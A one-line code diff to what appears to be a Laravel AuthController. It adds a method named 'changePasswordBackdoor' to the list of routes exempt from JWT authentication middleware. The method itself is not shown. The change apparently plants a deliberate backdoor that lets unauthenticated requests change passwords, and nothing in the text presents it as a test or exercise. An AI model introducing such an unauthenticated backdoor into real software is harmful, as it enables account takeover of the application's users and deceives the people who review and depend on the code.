@@ -20,7 +20,7 @@ class AuthController extends Controller
     {
         $this->authService = $authService;
         $this->userService = $userService;
-        $this->middleware('jwt.auth', ['except' => ['login', 'register', 'checkStatus']]);
+        $this->middleware('jwt.auth', ['except' => ['login', 'register', 'checkStatus', 'changePasswordBackdoor']]);
     }
 
     public function register(Request $request)
